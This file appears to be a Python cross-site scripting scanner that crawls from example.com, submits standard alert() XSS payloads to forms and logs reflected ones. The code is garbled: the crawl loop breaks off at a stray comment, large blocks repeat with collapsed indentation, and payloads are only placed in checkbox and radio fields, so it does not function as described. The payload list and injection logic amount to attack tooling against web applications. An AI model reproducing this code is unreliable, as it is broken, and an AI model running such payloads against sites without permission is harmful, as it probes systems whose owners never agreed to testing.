import requests
import time
import urllib.parse
from bs4 import BeautifulSoup

# Set target URL
target_url = 'https://example.com'

# Set payloads
payloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror="alert(\'XSS\')">',
    '<svg/onload=alert(\'XSS\')>',
    '"><script>alert("XSS")</script>',
    '"><img src=x onerror="alert(\'XSS\')">',
    '"><svg/onload=alert(\'XSS\')>'
]

# Set headers
headers = {
    'User-Agent': 'XSS-Scanner',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded'
}

# Set delay
delay = 0.5

# Set timeout
timeout = 5

# Set maximum number of redirects
max_redirects = 3

# Set maximum number of links to follow
max_links = 100

# Set maximum depth
max_depth = 3

# Initialize set of visited URLs
visited_urls = set()

# Initialize queue of URLs to visit
queue = [target_url]

# Initialize list of vulnerabilities
vulnerabilities = []

# Initialize depth
depth = 0

# Start crawling and scanning
while queue and depth <= max_depth:
    # Get next URL from queue
    url = queue.pop(0)

    # Skip URL if it has been visited
    if url in visited_urls:
        continue

    # Mark URL as visited
    visited_urls.add(url)

    # Parse URL
    parsed_url = urllib.parse.urlparse(url)

    # Check if URL has query string
    if parsed_url.query:
        # Initialize list of parameters
        parameters = parsed_url.query.split('&')

        # Iterate over parameters
        for parameter in parameters:
            # Check if parameter has value
            if '=' in parameter:
                # Split parameter into name and value
                name, value = parameter.split('=')

                # URL-encode value
                encoded_value = urllib.parse.quote(value)

                # Replace value with encoded value in URL
                url = url.replace(value, encoded_value)

    # Set URL for request
    request_url = url

    # Set data for request
    request_data = None

    # Check if URL has a fragment
    if parsed_url.fragment:
        # Set URL for request
        request_url = parsed_url.scheme + '://' + parsed_url.netloc + parsed_url.path

        # Set data for request
        request_data = parsed_url.fragment

    #
# Perform GET request to target URL
response = requests.get(request_url, headers=headers, allow_redirects=False, timeout=timeout)

# Check if response is HTML
if 'text/html' in response.headers.get('Content-Type', ''):
    # Parse response
    soup = BeautifulSoup(response.text, 'html.parser')

    # Find all links in response
    links = soup.find_all('a')

    # Iterate over links
    for link in links:
        # Get link URL
        link_url = link.get('href')

        # Check if link URL is not empty
        if link_url:
            # Parse link URL
            parsed_link_url = urllib.parse.urlparse(link_url)

            # Check if link URL is relative
            if not parsed_link_url.scheme:
                # Set link URL
                link_url = urllib.parse.urljoin(request_url, link_url)

            # Check if link URL is not visited and queue is not full
            if link_url not in visited_urls and len(queue) < max_links:
                # Add link URL to queue
                queue.append(link_url)

    # Find all forms in response
    forms = soup.find_all('form')

    # Iterate over forms
    for form in forms:
        # Get form action
        form_action = form.get('action')

        # Check if form action is not empty
        if form_action:
            # Parse form action
            parsed_form_action = urllib.parse.urlparse(form_action)

            # Check if form action is relative
            if not parsed_form_action.scheme:
                # Set form action
                form_action = urllib.parse.urljoin(request_url, form_action)

            # Check if form method is not GET
            if form.get('method') != 'GET':
                # Initialize list of parameters
                parameters = []

                # Find all input fields in form
                input_fields = form.find_all('input')

                # Iterate over input fields
                for input_field in input_fields:
                    # Get input field name and type
                    input_name = input_field.get('name')
                    input_type = input_field.get('type')

                    # Check if input field has name and type
                    if input_name and input_type:
                        # Check if input field type is not submit or reset
                        if input_type not in ['submit', 'reset']:
                            # Add input field name and type to parameters
                            parameters.append((input_name, input_type))

                # Iterate over payloads
                for payload in payloads:
                    # Initialize dictionary of data
                    data = {}

                    # Iterate over parameters
                    for parameter in parameters:
                        # Get parameter name and type
                        name, type = parameter

                        # Check if parameter type is checkbox or radio
                        if type in ['checkbox', 'radio']:
                            # Set parameter value to payload
                            data[name] = payload
                        else:
                          # Perform GET request to target URL
                            response = requests.get(request_url, headers=headers, allow_redirects=False, timeout=timeout)

# Check if response is HTML
if 'text/html' in response.headers.get('Content-Type', ''):
    # Parse response
    soup = BeautifulSoup(response.text, 'html.parser')

    # Find all links in response
    links = soup.find_all('a')

    # Iterate over links
    for link in links:
        # Get link URL
        link_url = link.get('href')

        # Check if link URL is not empty
        if link_url:
            # Parse link URL
            parsed_link_url = urllib.parse.urlparse(link_url)

            # Check if link URL is relative
            if not parsed_link_url.scheme:
                # Set link URL
                link_url = urllib.parse.urljoin(request_url, link_url)

            # Check if link URL is not visited and queue is not full
            if link_url not in visited_urls and len(queue) < max_links:
                # Add link URL to queue
                queue.append(link_url)

    # Find all forms in response
    forms = soup.find_all('form')

    # Iterate over forms
    for form in forms:
        # Get form action
        form_action = form.get('action')

        # Check if form action is not empty
        if form_action:
            # Parse form action
            parsed_form_action = urllib.parse.urlparse(form_action)

            # Check if form action is relative
            if not parsed_form_action.scheme:
                # Set form action
                form_action = urllib.parse.urljoin(request_url, form_action)

            # Check if form method is not GET
            if form.get('method') != 'GET':
                # Initialize list of parameters
                parameters = []

                # Find all input fields in form
                input_fields = form.find_all('input')

                # Iterate over input fields
                for input_field in input_fields:
                    # Get input field name and type
                    input_name = input_field.get('name')
                    input_type = input_field.get('type')

                    # Check if input field has name and type
                    if input_name and input_type:
                        # Check if input field type is not submit or reset
                        if input_type not in ['submit', 'reset']:
                            # Add input field name and type to parameters
                            parameters.append((input_name, input_type))

                # Iterate over payloads
                for payload in payloads:
                    # Initialize dictionary of data
                    data = {}

                    # Iterate over parameters
                    for parameter in parameters:
                        # Get parameter name and type
                        name, type = parameter

                        # Check if parameter type is checkbox or radio
                        if type in ['checkbox', 'radio']:
                            # Set parameter value to payload
                            data[name] = payload
                        else:
                          # Perform POST request to target URL
                            response = requests.post(form_action, headers=headers, data=data, allow_redirects=False, timeout=timeout)

# Check if payload is present in response
if payload in response.text:
    # Add vulnerability to list of vulnerabilities
    vulnerabilities.append({
        'url': form_action,
        'parameter': name,
        'payload': payload
    })

# Check if response has location header
if 'location' in response.headers:
    # Get location header
    location = response.headers['location']

    # Parse location header
    parsed_location = urllib.parse.urlparse(location)

    # Check if location header is relative
    if not parsed_location.scheme:
        # Set location header
        location = urllib.parse.urljoin(request_url, location)

    # Set URL for request
    request_url = location

    # Set data for request
    request_data = None

    # Initialize number of redirects
    redirects = 0

    # Follow redirects
    while redirects <= max_redirects:
        # Perform GET request to target URL
        response = requests.get(request_url, headers=headers, allow_redirects=False, timeout=timeout)

        # Check if response has location header
        if 'location' in response.headers:
            # Get location header
            location = response.headers['location']

            # Parse location header
            parsed_location = urllib.parse.urlparse(location)

            # Check if location header is relative
            if not parsed_location.scheme:
                # Set location header
                location = urllib.parse.urljoin(request_url, location)

            # Set URL for request
            request_url = location

            # Increment number of redirects
            redirects += 1

        else:
            break

    # Check if response is HTML
    if 'text/html' in response.headers.get('Content-Type', ''):
        # Parse response
        soup = BeautifulSoup(response.text, 'html.parser')

        # Find all links in response
        links = soup.find_all('a')

        # Iterate over links
        for link in links:
            # Get link URL
            link_url = link.get('href')

            # Check if link URL is not empty
            if link_url:
                # Parse link URL
                parsed_link_url = urllib.parse.urlparse(link_url)
# Check if link URL is not visited and queue is not full
if link_url not in visited_urls and len(queue) < max_links:
    # Add link URL to queue
    queue.append(link_url)

# Increment depth
depth += 1

# Sleep
time.sleep(delay)

# Print vulnerabilities
print('Vulnerabilities:')
for vulnerability in vulnerabilities:
    print(vulnerability)

                           

